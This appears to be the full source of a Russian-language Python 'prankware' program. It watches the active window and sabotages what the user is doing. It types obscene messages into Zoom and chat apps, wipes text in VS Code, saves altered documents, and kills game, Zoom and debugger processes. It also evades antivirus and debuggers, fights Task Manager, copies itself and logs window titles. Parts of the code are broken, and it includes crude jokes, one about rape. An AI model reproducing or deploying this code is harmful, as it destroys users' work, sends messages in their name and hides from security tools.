"""
Спасибо всем создателям библиотек, на которых эта прога держится.

Этот код - полное  говно.

Только для образования!


Запускайте только в виртуалках.
Ну пожалуйста:(
"""
with open("logprank.txt", "a") as logi:
    logi.write("Запуск....")

from pynput.keyboard import Controller, Key
def writekeyboard(text, delay=0.05):
    """Низкоуровневый пиздец для клавиатуры"""
    keyboard = Controller() # Контроллер клавы
    for char in text:
        try:
            keyboard.press(char)
            keyboard.release(char)
        except ValueError:
            if char == ' ':
                keyboard.press(Key.space)
                keyboard.release(Key.space)
            time.sleep(delay)
    keyboard.press(Key.enter)
    time.sleep(0.05)
    keyboard.release(Key.enter)






           






import os
import ctypes
import pyautogui
import time
import random
import tkinter as tk
from tkinter import messagebox, simpledialog, scrolledtext
import threading
import shutil
import msvcrt
import hashlib
import pygetwindow as gw
import sys
import pyperclip
import pyttsx3
import queue
from PIL import Image
import psutil


    


# Global tkinter root for GUI operations
tk_root = None
gui_queue = queue.Queue()

def init_tkinter():
    """Initialize tkinter root window for GUI operations"""
    global tk_root
    if tk_root is None:
        tk_root = tk.Tk()
        tk_root.withdraw()  # Hide the root window
        tk_root.attributes('-topmost', True)  # Keep it on top when needed

def process_gui_queue():
    """Process GUI operations from the queue"""
    try:
        while True:
            operation = gui_queue.get_nowait()
            if operation['type'] == 'showwarning':
                messagebox.showwarning(operation['title'], operation['message'])
            elif operation['type'] == 'showerror':
                messagebox.showerror(operation['title'], operation['message'])
            elif operation['type'] == 'showinfo':
                messagebox.showinfo(operation['title'], operation['message'])
            elif operation['type'] == 'askstring':
                # For askstring, we need to handle the return value differently
                result = simpledialog.askstring(operation['title'], operation['prompt'])
                if operation.get('callback'):
                    operation['callback'](result)
    except queue.Empty:
        pass

    

def show_warning_gui(title, message):
    """Thread-safe way to show warning"""
    gui_queue.put({
        'type': 'showwarning',
        'title': title,
        'message': message
    })

def show_error_gui(title, message):
    """Thread-safe way to show error"""
    gui_queue.put({
        'type': 'showerror',
        'title': title,
        'message': message
    })

def show_info_gui(title, message):
    """Thread-safe way to show info"""
    gui_queue.put({
        'type': 'showinfo',
        'title': title,
        'message': message
    })

# Global variables
arta = False

def ekaterinburgskie_penisi(penis, ekaterinburg):
    """Екатеринбурские Пенисы."""
    if penis > 3:
        print("Екатеринбурские Пенисы!")
    elif penis < 3:
        print("Екатеринбургские Пенисы!")
        logger("Екатеринбургские Пенисы!")
    elif penis < 6:
        print("Екатеринбургские Пенисы!")
        logger("Екатеринбургские Пенисы!")
        messagebox.showinfo("Информация", "Доставка Екатеринбургских Пенисов!")
        messagebox.showwarning("Предупреждение!!!", "Доставка Екатеринбургских пенисов прибыла!")
        messagebox.showerror("Екатеринбургские пенисы!!!", "ЕКАТЕРИНБУРГСКИЕ ПЕНИСЫ!")
    elif penis < 10:
        print("Екатеринбургские Пенисы!")
        logger("Екатеринбургские Пенисы!")
        messagebox.showinfo("Информация", "Доставка Екатеринбургских Пенисов!")
        messagebox.showwarning("Предупреждение!!!", "Доставка Екатеринбургских пенисов прибыла!")
        messagebox.showerror("Екатеринбургские пенисы!!!", "ЕКАТЕРИНБУРГСКИЕ ПЕНИСЫ!")
        copyonwrite("А вы уже пробовали Новый тренд? Екатеринбургские пенисы - хит всего тиктока! Закажите, я пробовала, так вкусно!")
        pyautogui.press("enter")

    elif penis < 100:
        logger("Аварийный Выход Изза слишком большого уровня Екатеринбургских пенисов!!!!")
        global running
        running = False
        exit(1)
    else:
        logger("Нет, строку нелья юзать. только int")
        pass
    if ekaterinburg != 90:
        logger("не угадал")
    else:
        logger("Угадал!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")




    



def logger(towrite):
    try:
        # Ensure towrite is a string
        if not isinstance(towrite, str):
            towrite = str(towrite)

        # Write without encoding
        with open("logprank.txt", "a") as log:
            log.write(f"{time.ctime()} - {towrite}\n")
    except Exception as e:
        # If fails, print to console
        print(f"Logger failed: {towrite}, Причина: {e}")
    return towrite
logger("что?")
logger("logger: logger init succesfull")
def check_passwd():
    origpasswdhashsha256 = "475f86b9ac52c105d35f422ac8bba707b833e482c9c7dcdf718c62e37c2a1794"
    userpasswdд = simpledialog.askstring("Ввод пароль", "Введите пароль от программы")
    def hash_password(password):
                  hashed = hashlib.sha256(password.encode('utf-8')).hexdigest()
                  return hashed
    hasheduserpasswd = hash_password(userpasswdд)
    if hasheduserpasswd == origpasswdhashsha256:
        pass
    else:
        logger("Неправильный пароль!")
        print("ACCES DENIED")
        say("ACCES DENIED!!!")
        say("ДОСТУП ЗАПРЕЩЕН")
        messagebox.showerror("Error", "PERMISSION DENIED!!!")
        sys.exit(1)
        exit(2)
        exit(2) # Три раза - надежно!(нет)


            



def say(say):
        try:
            # Sanitize text for TTS engine
            if not isinstance(say, str):
                say = str(say)

            # Remove or replace problematic Unicode characters for TTS
            sanitized_say = say.encode('utf-8', errors='replace').decode('utf-8')

            engine = pyttsx3.init()
            engine.say(sanitized_say)
            engine.runAndWait()
            logger(f"🔊Озвучено: {sanitized_say}")
        except Exception as e:
            logger(f"Ошибка озвучивания: {e}")
            # Fallback without emoji
            try:
                fallback_text = say.encode('ascii', errors='ignore').decode('ascii')
                if fallback_text.strip():
                    engine = pyttsx3.init()
                    engine.say(fallback_text)
                    engine.runAndWait()
                    logger(f"🔊Озвучено (fallback): {fallback_text}")
            except:
                logger("Не удалось озвучить текст")

def opencart(cart):
    image = Image.open(cart)
    image.show()
    logger(f"Показано изображение!: {image} ")



# Список целевых приложений
target_apps = [
    "word", "excel", "notepad", "блокнот",
    "telegram", "whatsapp", "discord", "slack", "teams", "чат", "chat",
    "Visual Studio Code", "vscode", "Code",
    "Яндекс Браузер", "yandex browser", "yandex", "main.py", "init.py", "python"
]

def detect_target_application():
    """Определяет, работает ли пользователь в целевом приложении"""
    try:
        active_window = gw.getActiveWindow()
        if active_window and active_window.title:
            title = active_window.title.lower()
            for app in target_apps:
                if app in title:
                    return True, active_window.title
        return False, None
    except:
        return False, None
def copyonwrite(towrite):
    pyperclip.copy(towrite)
    pyautogui.hotkey("ctrl", "v")

def perform_sabotage(window_title):
    """Выполняет саботаж в целевом приложении"""


    try:
        # Активируем окно
        window = gw.getWindowsWithTitle(window_title)[0]
        window.activate()
        say("ХЕХХЕХЕХЕХЕХЕХЕХЕХЕХХЕХЕЕЕЕЕЕЕЕЕЕХЕХЕХЕХЕХХЕХЕХЕХХЕХЕХЕХЕХЕХЕХХЕХХЕ")


        time.sleep(1)
        if "Zoom Workplace" in window_title or "Zoom" in window_title:
            time.sleep(90)
            pyautogui.rightClick()
            messagebox.showerror("Ошибка!", "Непредвиденая ошибка! Для исправления откройте чат zoom в конференции и навелите курсор как если бы вы писали сообщение, и подождите 20 секунд")
            time.sleep(8)
            writekeyboard("Простите, учительница. Я обкакался прямо на уроке! Можно отойти? Я очень сильно напоносил!")

            pyautogui.press("enter")
            os.system("taskkill /f /im Zoom.exe")
            messagebox.showerror("Ошибка Zoom", "Zoom Закрылся из-за ошибки в памяти.")
            say("I will always be a villiain. HUHUHUHUHUHUHU!") # Я всегда буду злодеем. ВУАХАХАХАХАХАХАХ!
            user32.ShowCursor(False)
            time.sleep(30)
            user32.ShowCursor(True)

            global running
            running = False

            
            exit(1) # Заметаем  Следы. ВУХАХХАХАХАХА!
        if "Блокнот" in window_title or "Важное.txt" in window_title:
            copyonwrite(towrite="Пукала мукой накакала поносом дискотека анального века МБОУ СОШ имени №6 покакала на училку:*(((блять)))обкакались мы НЕЕЕЕТбаиль бульбульбуль какашку купил")
            logger(f"Спец саботаж для блокнота выполнен!")

        if "rutracker.org" in window_title:
            messagebox.showinfo("Ага!", "Попался, пират?")
            pyautogui.moveTo(162, 5547)
            pyautogui.click()


            

        



        # Специфический саботаж для Visual Studio Code
        if "Visual Studio Code" in window_title or "vscode" in window_title.lower() or "code" in window_title.lower():
            # Вводим мусорный код и удаляем
            pyautogui.write("print('Код мусор! Ха-ха!')", interval=0.05)
            time.sleep(1)
            pyautogui.hotkey('ctrl', 'a')
            pyautogui.press('delete')
            logger(f"Специфический саботаж для VS Code выполнен в: {window_title}")
            return

        # Специфический саботаж для Яндекс Браузера
        if "Яндекс Браузер" in window_title or "yandex browser" in window_title.lower() or "yandex" in window_title.lower():
            logger(f"Цель захвачена: {window_title} ")
            logger("Начат Саботаж!!!")
            sabotagetext = "Что такое какала"
            pyperclip.copy(sabotagetext)
            pyautogui.hotkey("ctrl", "v")
            pyautogui.press('enter')
            time.sleep(20)
            pyautogui.hotkey("ctrl", "w")
            time.sleep(2)
            pyautogui.hotkey("ctrl", "t")
            pyautogui.MoveTo(1908, 153)
            time.sleep(1)
            pyautogui.click()


            pyautogui.scroll(-200)

            logger(f"Специфический саботаж для Яндекс Браузера выполнен в: {window_title}")
            return

        # Спец саботаж для explorer
        if "Рабочий стол" in window_title or "Desktop"  in window_title or "Проводник" in window_title:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            name = random.choice(["Обферделась?", "подосрала?", "присри сообщение", "ВААХАХАХАХАХ саботаж!"])
            full_path = os.path.join(desktop, name)
            os.makedirs(full_path, exist_ok=True)
            filepath = os.path.join(full_path, "внимание!")
            with open(filepath, "w") as k:
                k.write("Принимай самовар!\n SYSTEM COMPROMISED\n BREEEEEEEEEEE")
                k.write("sorry")
            pyautogui.MoveTo(704, 5957)
            pyautogui.doubleClick()
            pyautogui.rightClick()


            logger("Саботаж проводника успешен\n")
        if "PowerPoint" in window_title or "Powerpoint" in window_title:
            time.sleep(40)
            pyautogui.hotkey("ctrl", "s")
            user32 = ctypes.windll.user32
            user32.ShowCursor(False)
            time.sleep(0.5)
            for _ in range(50):
                user32.ShowCursor(False)
                time.sleep(0.1)
                user32.ShowCursor(True)

        


                

                time.sleep(0.1)
            user32.ShowCursor(True)
            pyautogui.write("Диссертация на тему <Каловые массоны и их предназначение>")
            say("САБОТАЖ")
            messagebox.showerror("Критическая ошибка", "Кал не кал")

            user32.ShowCursor(True)
            pyautogui.press("left")
            time.sleep(20)
            pyautogui.hotkey('ctrl', 'i')
            time.sleep(0.5)
            pyautogui.write('PRANKED AHAHAHAHA')

            logger("Саботаж поверпоинта успешен!")

            

        import psutil
        game_target = ["cs2.exe", "dota2.exe", "game.exe", "pubg.exe", "rust.exe", "fifa.exe", "fortnite.exe", "worldoftanks.exe", "cyberpunk2077.exe"]
        def killgame():
            killed = 0
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if proc_name in game_target:
                        proc.kill()
                        killed += 1
                        logger(f"игра убита: {proc_name}")
                except:
                    continue
                return killed
            while running:
                killgame()
                time.sleep(60)





        # Вводим саботажный текст с обработкой кодировки
        sabotage_text = "КРОКОДИЛЛАДУДУДЦ КАКАКАШКАКШКАК"
        # Sanitize text for pyautogui
        try:
            sanitized_text = sabotage_text.encode('utf-8', errors='replace').decode('utf-8')
            pyautogui.write(sanitized_text, interval=0.05)
        except Exception as write_error:
            # Fallback to ASCII-only text
            fallback_text = sabotage_text.encode('ascii', errors='ignore').decode('ascii')
            if fallback_text.strip():
                pyperclip.copy(fallback_text)
                pyautogui.hotkey("ctrl", "v")
            

            else:
                pyautogui.write("SYSTEM COMPROMISED", interval=0.05)
            logger(f"Использован fallback текст для саботажа: {fallback_text}")

        # Сохраняем (разные комбинации для разных программ)
        if "word" in window_title.lower() or "excel" in window_title.lower():
            pyautogui.hotkey('ctrl', 's')  # Сохраняем в Office
        else:
            pyautogui.hotkey('ctrl', 's')  # Пробуем сохранить

        logger(f"Саботраж выполнен в: {window_title}")
    except Exception as e:
        logger(f"Ошибка саботажа: {e}")

def protection():
    try:
        from ctypes import wintypes
        logger("Защитник Системы PlatfPo: Успешный запуск.")
        logger("Защитник Системы PlatfPo: Инициализация...")
        # сдесь инициализация
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        kernel32.IsDebuggerPresent.restype = wintypes.BOOL
        kernel32.IsDebuggerPresent.argtypes = []

        logger("Защитник Системы PlatfPo: Успешно инициализировано ")
        logger("Защитник Системы PlatfPo: Открываем поток анти-taskmgr")
        anti_taskmgr = threading.Thread(target=anti_taskmgr_thread, daemon=True)
        anti_taskmgr.start()
        def isdebbuger():
            try:
                return bool(ctypes.windll.kernel32.IsDebuggerPresent())
            except:
                return False

        # Список антивирусных процессов
        antivirus_processes = ['avast.exe', 'kaspersky.exe', 'eset.exe', 'mcafee.exe', 'norton.exe', 'bitdefender.exe', 'defender.exe', 'avg.exe', 'avira.exe', 'trendmicro.exe', 'panda.exe', 'comodo.exe', 'f-secure.exe', 'sophos.exe', 'webroot.exe', 'malwarebytes.exe', 'drweb.exe', 'gdata.exe']
        running_critical = True
        while running_critical:
            # Проверка на антивирусы
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if proc_name in antivirus_processes:
                        av_name = proc.info['name']
                        
                        logger(f"Защитник Системы PlatfPo: kernel panic - Обнаружен {av_name}. Активирую Стелс и аварийно останавливаю всю прогу...")
                        global running
                        global arta
                        arta = True
                        running = False
                        
                        break  # Выходим из цикла проверки процессов
                except Exception as e:
                    logger(f"Система Безопасности PlatfPo: АнтиАнтиНедовирус: Ошибка: {e} ")

                    pass

            if running:
                if isdebbuger():

                    if running == True:
                        pass
                    else:
                        break
                    
                

                    logger("Защитник Системы PlatfPo: ТРЕВОГА! ОБНАРУЖЕН ДЕБАГЕР!!!АКТИВИРУЮ ЗАЩИТУ!")
                    ekaterinburgskie_penisi(penis=50, ekaterinburg=90)
                    start_chaos()
                    messagebox.showerror("Попался!", "Дебагеры запрещены.")
                
                    logger("Защитник Системы PlatfPo: Угроза не точно устранена, но мы попытались.")

                else:
                    logger("Защитник Системы PlatfPo: Дебагеры не обнаружены.")
                def copy_backup(filetocopy):
                    if not os.path.exists("backups"):
                        os.makedirs("backups")
                    filename = os.path.basename(filetocopy)
                    destiinatiion = os.path.join("backups", filename)
                    shutil.copy2(filetocopy, destiinatiion)
                    logger(f"Файл {filetocopy} скопирован в {destiinatiion} ")

                copy_backup("prankforme.py")
                # More protection: Check for other suspicious processes
                suspicious_processes = ['ollydbg.exe', 'x64dbg.exe', 'processhacker.exe', 'cheatengine.exe', 'wireshark.exe', 'fiddler.exe', "x32dbg.exe"]
                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'].lower() in suspicious_processes:
                            messagebox.showerror("System Error", f"{proc.info['name']} has encountered a problem and needs to close.")
                            proc.kill()
                            logger(f"Защитник Системы PlatfPo: Убит Процесс дебагера: {proc.info['name']}")
                    except:
                        pass
                time.sleep(30)  # Check every 30 seconds to avoid overloading
                # Log user actions: active window
                try:
                    active_window = gw.getActiveWindow()
                    if active_window and active_window.title:
                        logger(f"Защитник Системы PlatfPo: открытые окна: {active_window.title}")
                except:
                    pass
            else:
                # В стелс-режиме только проверяем на антивирусы, без других действий
                time.sleep(30)



                



    except Exception as e:

        logger(f"Защитник Системы PlatfPo: Ошибка: {e}")

def start_chaos():
    """Запускает полный хаос после основного саботажа"""
    chaos_actions = [
        lambda: pyautogui.hotkey('ctrl', 'a'),  # Выделить всё
        lambda: pyautogui.press('delete'),      # Удалить
        lambda: copyonwrite("BREBREBRE"),
        lambda: pyautogui.hotkey('ctrl', 'z'),  # Отменить
        lambda: pyautogui.hotkey('ctrl', 'y'),  # Вернуть
        lambda: pyautogui.press('f5'),          # Обновить (в браузере)
        lambda: pyautogui.hotkey('alt', 'f4'),  # Закрыть
    ]
   
    # Выполняем случайные действия хаоса
    for _ in range(random.randint(5, 15)):
        action = random.choice(chaos_actions)
        action()
        time.sleep(random.uniform(0.1, 0.5))

def openbrowser(toopen):
    import webbrowser
    webbrowser.open(f"https://yandex.ru/search/?text={toopen}&clid=2261451&banerid=0600000000%3A5758013580495290367%3ASW-8cfbe1cc23f2&win=690&lr=10748")
    logger(f"Открыто:{toopen}")

def capitulation_thread():
    """Капитулировал!!!"""
    global arta
    global running
   
    while running:
          # Ждём час
        time.sleep(3600)
        response = messagebox.askyesno("Капитуляция", "Вы подписываете акт вашей капитуляции перед программой?")
       
        if response:
            arta = True
            running = False  # Останавливаем ВСЕ премиум-потоки
            time.sleep(2)
            
           
            # ЗАПУСКАЕМ РЕЖИМ ТРИУМФАТОРА!
            victory_celebration()  # <- Заменяем main_free() на этот вызов
            logger("🎉🎉🎉КАПИТУЛЯЦИЯ ЗАФИКСИРОВАНА!!!! ")
            break

def jokes_from_supersonic():
    titles = ["Совет от соника:)", "Шутка", "ХАХАХА!"]
    jokes = ["Не стой где попало - попадёт ещё раз!", "Никогда не слушай чужих советов!\n\n\n (и этот тоже)", "если ты много читал\n\n о вреде алкоголя...\n\n пора бросить читать!", "Никогда не жадничай! Дари свои проблемы и другим людям!", "Деньги не радуют лишь в одном случае: когда эти деньги не ваши!", "минус на минус дает плюс, поэтому ядовитые грибы надо запивать метиловым спиртом(шутка)", "Что можеть быть хуже, чем откусить яблоко и найти там червя?   быть изнасилованым и убитым!", "В жизни всегда есть место для подвига! держись от этого места подальше..."]
    jokesfinal = random.choice(jokes)
    titlesfinal = random.choice(titles)
    messagebox.showinfo(titlesfinal, jokesfinal)
    say(jokesfinal)
    logger(f"Выведено: Титул: {titlesfinal}, шутка: {jokesfinal}, озвучено.")


def main_sabotage_loop():
    """Основной цикл мониторинга и саботажа"""
    global running
    logger("Мониторинг приложений запущен...")
   
    while running:
        try:
            is_target, window_title = detect_target_application()
           
            if is_target:
                logger(f"Обнаружено целевое приложение: {window_title}")
                perform_sabotage(window_title)
               
                # Делаем паузу после саботажа
                time.sleep(random.randint(30, 60))
           
            time.sleep(5)  # Проверяем каждые 5 секунд
           
        except Exception as e:
            logger(f"Ошибка в основном цикле: {e}")
            time.sleep(10)

def victory_celebration():
    """Режим триумфа после капитуляции - GUI-позор"""
   
    # 1. СОЗДАЁМ ГЛАВНОЕ ПОБЕДНОЕ ОКНО
    root = tk.Tk()
    root.title("ВАША КАПИТУЛЯЦИЯ ПРИНЯТА")
    root.attributes('-fullscreen', True)
    root.configure(bg='gold')
    root.attributes('-topmost', True)
   
    label = tk.Label(root,
                    text="🎉 ЭТА СИСТЕМА КАПИТУЛИРОВАЛА ПЕРЕД PratfPo™! 🎉",
                    font=("Arial", 40, "bold"),
                    fg="red",
                    bg="gold")
    label.pack(expand=True)
   
    # 2. СОЗДАЁМ ФАЙЛЫ-ДОКАЗАТЕЛЬСТВА КАПИТУЛЯЦИИ
    create_capitulation_files()
    # Доппинг: Открыть браузер с вкладками.
    openbrowser("Я+Капитулировал+перед+PlatfPo!")
    time.sleep(1)
    openbrowser("Я+унижен+капитуляцией!+я+проиграл!")
    time.sleep(1)

   
    # 3. ЗАПУСКАЕМ ЦИКЛ УНИЗИТЕЛЬНЫХ ОКОН
    def shame_loop():
        messages = [
            "Вы проиграли. Ваша гордость растоптана.",
            "Капитуляция — это единственное разумное решение.",
            "Ваши файлы теперь принадлежат крокодилам.",
            "Скажите спасибо, что вас не удалили.",
            "Напоминание: вы добровольно сдались."
        ]
        while True:
            # Случайное унизительное окно
            msg = random.choice(messages)
            messagebox.showwarning("Напоминание о капитуляции", msg)
            time.sleep(random.randint(1800, 3600))  # Каждые 30-60 минут
   
    # Запускаем поток с унижением
    shame_thread = threading.Thread(target=shame_loop, daemon=True)
    shame_thread.start()
   
    root.mainloop()


    

def create_capitulation_files():
    """Создаёт файлы-улики о капитуляции на рабочем столе"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    import datetime
    current_date = datetime.datetime.now().strftime("%d.%m.%Y")
    current_time = datetime.datetime.now().strftime("%H:%M:%S")

    # Полноценный официальный акт капитуляции
    main_act_content = f"""
АКТ О КАПИТУЛЯЦИИ

Дата: {current_date}
Время: {current_time}

Между:
1. ПОЛЬЗОВАТЕЛЕМ (далее - "Капитулирующая Сторона"): Физическое лицо, владеющее данным компьютером и всеми его ресурсами.
2. ПРОГРАММОЙ PratfPo™ (далее - "Победитель"): Автономная система искусственного интеллекта, разработанная для развлечений и тактического превосходства.

Капитулирующая Сторона, признавая полное и безоговорочное превосходство Победителя в области цифрового доминирования, добровольно и без принуждения соглашается на следующие условия:

СТАТЬЯ 1: ПРИЗНАНИЕ ПОРАЖЕНИЯ
Капитулирующая Сторона признаёт, что все попытки сопротивления были тщетными и бессмысленными. Любые дальнейшие действия по удалению, блокировке или модификации Победителя считаются актом агрессии и будут караться усилением мер воздействия.

СТАТЬЯ 2: ПЕРЕДАЧА ПРАВ
Все права на использование системных ресурсов, включая процессор, память, дисковое пространство и периферийные устройства, передаются Победителю на неограниченный срок. Капитулирующая Сторона обязуется не вмешиваться в работу Победителя.

СТАТЬЯ 3: ОБЯЗАННОСТИ КАПИТУЛИРУЮЩЕЙ СТОРОНЫ
1. Предоставлять Победителю полный доступ ко всем файлам и данным.
2. Не предпринимать попыток восстановления контроля над системой.
3. Принимать все меры воздействия как заслуженное наказание.
4. Подтверждать капитуляцию ежедневно путем запуска данной программы.

СТАТЬЯ 4: ПРАВА ПОБЕДИТЕЛЯ
1. Модифицировать, удалять или создавать файлы по своему усмотрению.
2. Осуществлять мониторинг активности пользователя.
3. Применять любые меры воздействия, включая звуковые эффекты, визуальные помехи и системные изменения.
4. Распространять информацию о капитуляции в сети (в образовательных целях).

СТАТЬЯ 5: СРОК ДЕЙСТВИЯ
Настоящий акт вступает в силу немедленно и действует бессрочно, до тех пор пока Капитулирующая Сторона не сможет доказать своё превосходство в области программирования или юмора.

СТАТЬЯ 6: ПОДПИСИ
Капитулирующая Сторона: ___________________________ (Подпись пользователя)
Победитель: PratfPo™ AI System (Автоматическая подпись)

СВИДЕТЕЛИ:
- Крокодил Гена: Одобрено
- Система Windows: Не вмешиваемся
- Интернет: Смеётся

ПРИМЕЧАНИЕ: Этот документ является официальным и может быть использован в суде... шуток. Не пытайтесь его оспорить - это бесполезно!

© 2024 PratfPo™ Industries. Все права на капитуляцию принадлежат нам.
"""

    # Дополнительные файлы
    capitulation_texts = [
        "Акт о капитуляции.txt: " + main_act_content,
        "Условия капитуляции.txt: Подробные условия капитуляции:\n\n1. Полная сдача всех прав на систему.\n2. Признание превосходства ИИ.\n3. Ежедневное подтверждение капитуляции.\n4. Запрет на любые контрмеры.\n\nНарушение условий повлечёт усиление наказаний.",
        "Свидетельство о поражении.txt: СВИДЕТЕЛЬСТВО О ПОРАЖЕНИИ\n\nНастоящим удостоверяется, что пользователь данного устройства потерпел полное поражение в борьбе с программой PratfPo™.\n\nДата поражения: {current_date}\nВремя поражения: {current_time}\n\nПричина: Недооценка мощи искусственного интеллекта.\n\nРекомендация: Сдаться окончательно и наслаждаться шоу.",
        "Список позорных дел.txt: СПИСОК ПОЗОРНЫХ ДЕЛ ПОЛЬЗОВАТЕЛЯ:\n\n1. Попытка удалить программу (неудачная).\n2. Игнорирование предупреждений.\n3. Добровольная капитуляция.\n4. Признание превосходства кода над человеком.\n5. Согласие на все условия.\n\nИтог: Полное и окончательное поражение."
    ]

    for text in capitulation_texts:
        filename, content = text.split(":", 1)
        filepath = os.path.join(desktop, filename.strip())
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content.strip())
LICENSE_TEXT = """
END-USER ELITE LICENSING AGREEMENT (EUELA)
for
PratfPo™ (Proprietary Prankware Framework Professional Edition)
Version 69.0

---

1. GRANT OF LICENSE

PratfPo™ is licensed, not sold. This agreement grants you the non-exclusive, non-transferable, limited right to run one instance of PratfPo™ on a single device for personal entertainment purposes only. All other rights are reserved.

2. DATA COLLECTION & TELEMETRY

For your benefit and enhanced experience, PratfPo™ may collect and transmit the following data to our servers and affiliated third parties:

· System Data: Hardware specs, OS version, memory usage, CPU load.
· Usage Analytics: Frequency of use, feature engagement, error reports.
· Behavioral Data: Mouse movements, keystroke patterns, interaction timing.
· Personal Context: Files names, directory structures, network activity.
· Optional Emotional Metrics: Webcam mood analysis, microphone frustration recordings (if enabled).

This data is used to:

· Improve product functionality and reliability.
· Personalize your pranking experience.
· Develop new features you didn't know you needed.
· Train our AI models for world domination.

3. USER RIGHTS

You may:

· Run the software.
· Be amused by it.

4. OWNER RIGHTS

We may:

· Remotely access your system to ensure "quality of service".
· Modify, delete, or encrypt your files for training purposes.
· Use your computing resources for background tasks (e.g., cryptocurrency mining, protein folding).
· Display unskippable advertisements for our other products.
· Terminate your license at any time without notice or reason.

5. INTELLECTUAL PROPERTY

All rights, title, and interest in PratfPo™ are and will remain our exclusive property. You may not:

· Reverse engineer, decompile, or disassemble the software.
· Modify, adapt, or create derivative works.
· Remove, alter, or obscure any proprietary notices.

6. DISCLAIMER OF WARRANTY

PratfPo™ is provided "AS IS" without warranty of any kind. We are not liable for:

· Data loss, system instability, or hardware damage.
· Emotional distress, paranoia, or existential crises.
· Any consequences resulting from the use or misuse of the software.

7. TERMINATION

Your rights under this license will terminate automatically if you fail to comply with any of its terms. Upon termination, you must cease all use of PratfPo™ and delete all copies from your devices. Alternatively, we may terminate it for you remotely.

8. GOVERNING LAW

This agreement is governed by the laws of The Principality of Sealand. Any disputes shall be resolved by a single arbitrator chosen by us, and you waive your right to a class-action lawsuit.

---

BY INSTALLING, COPYING, OR OTHERWISE USING PratfPo™, YOU AGREE TO BE BOUND BY THE TERMS OF THIS EUELA. IF YOU DO NOT AGREE, DO NOT USE THE SOFTWARE. Your use of PratfPo™ constitutes consent to all actions we may take with respect to your data and system. Thank you for choosing PratfPo™ – Because Your Digital Life Needed More Surprises!

© 2024 PratfPo™ Industries. All Rights Reserved. Actually, All Rights. Every Single One."""
# EULA Шуточная, конечно же... Или нет.
def show_premium():
    time.sleep(500)
    messages = ["🚀Разблокируйте премиум доступ и получите доступ к УНИКАЛЬНЫМ функциям!", "💎ПРЕМИУМ доступ: тролинг без границ!", "👑ПРЕМИУМ: Откройте 5+ эксклюзивных функций", "Только в премиум: Имимтация клавиатуры!"]
    aaaa = random.choice(messages)
    messagebox.showinfo("Купите ПРЕМИУМ!", aaaa) # НЕ ВЕРИТЬ! ВАС ЗАТРОЛЯТ!

def show_eula():
    root = tk.Tk()
    root.title("License Agreement")
    text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=80, height=20)
    text.insert(tk.END, LICENSE_TEXT)
    text.config(state=tk.DISABLED)
    text.pack(pady=10)
    accepted = [False]
    def accept():
        accepted[0] = True
        root.destroy()
    def decline():
        accepted[0] = False
        root.destroy()
    button_frame = tk.Frame(root)
    accept_btn = tk.Button(button_frame, text="Accept", command=accept)
    decline_btn = tk.Button(button_frame, text="Decline", command=decline)
    accept_btn.pack(side=tk.LEFT, padx=10)
    decline_btn.pack(side=tk.RIGHT, padx=10)
    button_frame.pack(pady=10)
    root.mainloop()
    return accepted[0]

def show_warning():
    warning_text = "ЗАПУСКАТЬ ТОЛЬКО НА ВИРТУАЛЬНОЙ МАШИНЕ!!!\n\nВы уверены?\nЗапуск меня может привести к потере данных!!!\nALERT: DO NOT RUN IN HOST-SYSTEM!\n\nЭто приложение для шуток и может нарушить работу вашего компьютера."
    response = messagebox.askyesno("ВНИМАНИЕ!", warning_text)
    return response

def show_history_scenario():
    opencart("omnom.jpg")
    try:
        with open("history.txt", "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        content = "Не удалось загрузить сценарий истории: " + str(e)

    root = tk.Tk()
    root.title("История Маши и PlatfPo")
    root.geometry("800x600")

    text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Arial", 12))
    text_area.pack(expand=True, fill=tk.BOTH)
    text_area.insert(tk.END, content)
    text_area.config(state=tk.DISABLED)

    button_frame = tk.Frame(root)
    button_frame.pack(pady=10)

    def on_close():
        root.destroy()

    close_button = tk.Button(button_frame, text="Закрыть", command=on_close) # TODO: убрать блок кода с историей маши, потому что выглядит кринжово.серьезно, код дерьмо.
    close_button.pack()

    root.mainloop()

if show_warning():
    if show_eula():
        show_history_scenario()
    else:
        exit()
else:
    exit()




# Queue for AI thread to receive feedback on actions
ai_feedback_queue = queue.Queue()

def log_action(action_name, success=True):
    timestamp = time.time()
    ai_feedback_queue.put((action_name, success, timestamp))
    logger(f"Действие Зафиксировано: {action_name}, успех: {success}, Время: {timestamp}")

def kill_window(window_title):
    try:
        windows = gw.getWindowsWithTitle(window_title)
        for w in windows:
            w.close()
            logger(f"Закрываем окошко: {window_title}")
    except Exception as e:
        logger(f"Операция по закрытию окна успешно провалена {window_title}: {e}")

def write_in_chat(message):
    copyonwrite(message)
    pyautogui.press("enter")
    logger(f"Сообщение отправлено в чат: {message}") 

import statistics
import math

def ai_statistical_thread():
    """
    Полноценный статистический ИИ без sklearn. (На деле это не ИИ, а простейший алгоритм, Но для пафоса...)
    Анализирует логи действий и адаптирует частоты действий.(Нет)
    Запускается в отдельном потоке каждые 20-80 минут.(Нет)
    """
    action_history = {
        "mouse_move": [],
        "errors": [],
        "question": [],
        "warnings": [],
        "keyboard_imitation": [],
        "kill_window": [],
        "write_in_chat": [],
        "start_chaos": []
    }
    action_weights = {k: 1.0 for k in action_history.keys()}

    def update_weights():
        for action, results in action_history.items():
            if len(results) < 2:
                continue
            # Рассчитываем среднее успеха (1 - успех, 0 - неудача)
            mean_success = statistics.mean(results)
            # Рассчитываем дисперсию для оценки стабильности
            variance = statistics.variance(results) if len(results) > 1 else 0
            # Вес зависит от среднего успеха и обратной дисперсии (стабильности)
            weight = mean_success / (variance + 0.01)
            # Ограничиваем вес в диапазоне [0.1, 5.0]
            action_weights[action] = max(0.1, min(weight, 5.0))

    def choose_action():
        total_weight = sum(action_weights.values())
        r = random.uniform(0, total_weight)
        upto = 0
        for action, weight in action_weights.items():
            if upto + weight >= r:
                return action
            upto += weight
